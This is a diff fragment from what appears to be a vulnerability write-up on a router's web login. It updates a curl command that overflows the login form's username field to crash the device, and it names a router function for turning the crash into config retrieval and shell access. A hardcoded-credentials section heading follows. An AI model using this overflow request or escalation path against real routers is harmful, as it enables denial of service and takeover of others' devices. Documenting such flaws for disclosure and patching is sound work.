@@ -14,10 +14,10 @@ Buffer overflow in login form, Great!. One hell of a secure router!.
 
     strcpy(username, input_username)
 
-curl http://192.168.1.1/boaform/admin/formLogin_en  --data-raw 'username=AAAAAAAAAA * 4000'&psd=blah'
+curl http://192.168.1.1/boaform/admin/formLogin_en  --data-raw 'username=AAAAAAAAAA * 4000'&psd=blah&verification_code=CAPTCHA&csrftoken=CSRF_TOKEN'
 
 This would crash the router.
-Easiest way to leverage this buffer overflow to use 'saveconfig" funtion,
+Easiest way to leverage this buffer overflow to use 'formMgmConfig' funtion,
 which will get the "last_good.xml', then login and enable shell or whatever.
 
 ## Hardcoded credentials
